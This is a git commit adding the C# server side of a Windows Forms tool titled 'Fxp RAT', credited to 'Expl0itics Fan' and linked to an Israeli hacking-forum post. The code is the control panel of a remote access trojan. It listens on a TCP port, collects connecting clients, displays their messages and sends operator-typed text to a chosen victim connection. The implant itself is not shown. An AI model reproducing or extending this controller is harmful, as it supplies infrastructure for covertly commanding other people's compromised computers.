52b78a095ba29e10ddea4ecb8c8b7d6752aebb3a
danielsalama2 <73307691+danielsalama2@users.noreply.github.com>
2022-06-08 10:26:17 +0300

    Add files via upload

---
+++ C# Server side/WindowsFormsApp21/Form1.Designer.cs
@@ -0,0 +1,226 @@
+﻿namespace WindowsFormsApp21
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
+            this.listView1 = new System.Windows.Forms.ListView();
+            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.port = new System.Windows.Forms.TextBox();
+            this.ipd = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.send = new System.Windows.Forms.TextBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
+            this.treaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.label1 = new System.Windows.Forms.Label();
+            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
+            this.menuStrip1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(74, 265);
+            this.button1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(142, 49);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "start listener on:";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // backgroundWorker1
+            // 
+            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
+            // 
+            // listView1
+            // 
+            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader1});
+            this.listView1.HideSelection = false;
+            this.listView1.Location = new System.Drawing.Point(46, 42);
+            this.listView1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.listView1.Name = "listView1";
+            this.listView1.Size = new System.Drawing.Size(439, 204);
+            this.listView1.TabIndex = 2;
+            this.listView1.UseCompatibleStateImageBehavior = false;
+            this.listView1.View = System.Windows.Forms.View.Details;
+            this.listView1.SelectedIndexChanged += new System.EventHandler(this.listView1_SelectedIndexChanged_1);
+            // 
+            // columnHeader1
+            // 
+            this.columnHeader1.Text = "clients";
+            this.columnHeader1.Width = 230;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(496, 42);
+            this.textBox1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(462, 302);
+            this.textBox1.TabIndex = 4;
+            // 
+            // port
+            // 
+            this.port.Location = new System.Drawing.Point(92, 374);
+            this.port.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.port.Name = "port";
+            this.port.Size = new System.Drawing.Size(122, 26);
+            this.port.TabIndex = 5;
+            this.port.Text = "Port";
+            // 
+            // ipd
+            // 
+            this.ipd.Location = new System.Drawing.Point(46, 334);
+            this.ipd.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.ipd.Name = "ipd";
+            this.ipd.Size = new System.Drawing.Size(220, 26);
+            this.ipd.TabIndex = 6;
+            this.ipd.Text = "Ip-Address";
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(315, 329);
+            this.button2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(112, 35);
+            this.button2.TabIndex = 9;
+            this.button2.Text = "Send!";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click_1);
+            // 
+            // send
+            // 
+            this.send.Location = new System.Drawing.Point(315, 374);
+            this.send.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.send.Name = "send";
+            this.send.Size = new System.Drawing.Size(306, 26);
+            this.send.TabIndex = 10;
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(848, 355);
+            this.button3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(112, 35);
+            this.button3.TabIndex = 11;
+            this.button3.Text = "clear";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click_2);
+            // 
+            // menuStrip1
+            // 
+            this.menuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
+            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.treaToolStripMenuItem});
+            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
+            this.menuStrip1.Name = "menuStrip1";
+            this.menuStrip1.Padding = new System.Windows.Forms.Padding(9, 3, 0, 3);
+            this.menuStrip1.Size = new System.Drawing.Size(1006, 35);
+            this.menuStrip1.TabIndex = 14;
+            this.menuStrip1.Text = "menuStrip1";
+            this.menuStrip1.ItemClicked += new System.Windows.Forms.ToolStripItemClickedEventHandler(this.menuStrip1_ItemClicked);
+            // 
+            // treaToolStripMenuItem
+            // 
+            this.treaToolStripMenuItem.Name = "treaToolStripMenuItem";
+            this.treaToolStripMenuItem.Size = new System.Drawing.Size(55, 29);
+            this.treaToolStripMenuItem.Text = "exit";
+            this.treaToolStripMenuItem.Click += new System.EventHandler(this.treaToolStripMenuItem_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(808, 9);
+            this.label1.Name = "label1";
+            this.label1.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
+            this.label1.Size = new System.Drawing.Size(186, 20);
+            this.label1.TabIndex = 15;
+            this.label1.Text = "נוצר על ידי Expl0itics Fan";
+            // 
+            // linkLabel1
+            // 
+            this.linkLabel1.AutoSize = true;
+            this.linkLabel1.Location = new System.Drawing.Point(501, 9);
+            this.linkLabel1.Name = "linkLabel1";
+            this.linkLabel1.Size = new System.Drawing.Size(171, 20);
+            this.linkLabel1.TabIndex = 16;
+            this.linkLabel1.TabStop = true;
+            this.linkLabel1.Text = "לינק לפוסט של הפרוייקט";
+            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1006, 428);
+            this.Controls.Add(this.linkLabel1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.menuStrip1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.send);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.ipd);
+            this.Controls.Add(this.port);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.listView1);
+            this.Controls.Add(this.button1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.MainMenuStrip = this.menuStrip1;
+            this.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
+            this.Name = "Form1";
+            this.Text = "Fxp RAT";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.menuStrip1.ResumeLayout(false);
+            this.menuStrip1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Button button1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
+        private System.Windows.Forms.ListView listView1;
+        private System.Windows.Forms.ColumnHeader columnHeader1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox port;
+        private System.Windows.Forms.TextBox ipd;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox send;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.MenuStrip menuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem treaToolStripMenuItem;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.LinkLabel linkLabel1;
+    }
+}
+
---
+++ C# Server side/WindowsFormsApp21/Form1.cs
@@ -0,0 +1,230 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Threading;
+using System.Net.Sockets;
+using System.Text;
+//this.BeginInvoke((MethodInvoker)(() => ניתן להשתמש בזה בטרידס!!!!!!!!!!
+namespace WindowsFormsApp21
+{
+    public partial class Form1 : Form
+    {
+        Socket socketServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        public static string ip2;
+        public Socket client1;
+        public Socket streamer;
+        public string ip;
+        public static string ip3;
+
+        public string newLine = Environment.NewLine;
+
+        public static ListViewItem item2 = new ListViewItem(ip2, 1);
+
+        Dictionary<string, Socket> map = new Dictionary<string, Socket>();
+
+
+
+
+        public Form1()
+        {
+            InitializeComponent();
+            string hostName = Dns.GetHostName();
+            try
+            {
+                ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
+            }
+            catch { ip = Dns.GetHostByName(hostName).AddressList[1].ToString(); }
+            ipd.Text = ip;
+            port.Text = "443";
+
+            MessageBox.Show("Created by Expl0itics Fan from FXP \n ניתן למצוא את הקוד הפתוח של התוכנה בגיטהאב שלי \n נא לצאת מהתוכנה רק דרך כפתור היציאה שהגדרתי.");
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                IPEndPoint ip = new IPEndPoint(IPAddress.Parse(ipd.Text), int.Parse(port.Text));
+                socketServer.Bind(ip);
+                socketServer.Listen(1);
+                this.BeginInvoke((MethodInvoker)(() => textBox1.Text += ("listener began on " + ip + newLine)));
+                backgroundWorker1.RunWorkerAsync();
+            }
+            catch(Exception ex) { MessageBox.Show(ex.Message); }
+            
+        }
+
+        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
+        {
+
+
+            int i = 1;
+            while (i == 1)
+            {
+
+
+
+                try
+                {
+
+                    client1 = socketServer.Accept(); // כל פעם שמערכת מנסה להתחבר היא ת אושר
+                    ip2 = client1.RemoteEndPoint.ToString();
+                    map[ip2] = client1;
+                    textBox1.Invoke((MethodInvoker)delegate
+                    {
+                        textBox1.Text += ("Connection has been maded from " + ip2 + newLine);
+                    });
+                    Thread clientThread = new Thread(new ThreadStart(() => User(client1)));
+                    clientThread.Start();
+
+                }
+                catch { }
+
+            }
+            
+        }
+
+        public void User(Socket client)
+        {
+            
+            while (true)
+            {
+                try
+                {
+                    
+                    listView1.Invoke((MethodInvoker)delegate
+                    {
+                        ListViewItem hasMatch = listView1.FindItemWithText(ip2);
+
+
+                        if (hasMatch == null)
+                        {
+
+                            listView1.Invoke((MethodInvoker)delegate
+                            {
+                                try
+                                {
+                                    listView1.Items.Add(ip2);
+                                }
+                                catch (Exception ex)
+                                { MessageBox.Show(ex.Message); }
+
+                            });
+                        }
+                    });
+
+
+                    byte[] msg = new byte[1024];
+                    int size = client.Receive(msg);
+
+                    ListView findListView = new ListView();
+
+                    ip2 = client.RemoteEndPoint.ToString();
+
+                    textBox1.Invoke((MethodInvoker)delegate
+                    {
+                        textBox1.Text += ip2 + " >> " + System.Text.Encoding.ASCII.GetString(msg, 0, size) + newLine;
+                    });
+                    
+                }
+                catch
+                {
+
+
+                }
+
+                
+            }
+        }
+
+        public void tred()
+        {
+            
+
+        }
+
+        private void listView1_SelectedIndexChanged_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+            try
+            {
+                try
+                {
+                    ip3 = listView1.SelectedItems[0].Text;
+                    Socket clientToSend = map[ip3];
+                    try
+                    {
+                        byte[] Message = System.Text.Encoding.ASCII.GetBytes(send.Text);
+                        clientToSend.Send(Message);
+                    }
+                    catch
+                    {
+                        //                        listView1.SelectedItems[0].Remove();  // לא מצליח למחוק מהרשימה.
+                        textBox1.Text += "Connection has been closed. " + newLine;
+                    }
+                }
+                catch
+                {
+                    textBox1.Text += "No client selected. " + newLine;
+
+                }
+            }
+            catch
+            { }
+        }
+
+
+        private void button3_Click_2(object sender, EventArgs e)
+        {
+            textBox1.Text = "";
+        }
+
+        private void sToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void treaToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://www.fxp.co.il/showthread.php?t=21287600");
+
+        }
+    }
+}
